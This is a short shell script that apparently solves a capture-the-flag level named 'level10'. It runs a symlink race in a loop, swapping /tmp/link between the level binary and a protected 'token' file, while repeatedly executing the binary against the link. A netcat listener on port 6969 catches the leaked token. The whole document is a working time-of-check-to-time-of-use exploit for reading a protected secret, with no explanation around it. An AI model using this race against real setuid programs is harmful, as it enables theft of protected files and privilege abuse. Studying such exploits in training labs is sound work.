#!/bin/sh


while true; 
do 
    ln -fs ~/level10 /tmp/link; 
    ln -fs ~/token /tmp/link; 
done;&
(
while true; 
do 
   ~/level10 /tmp/link 0.0.0.0;
done;)&

nc -lk 6969;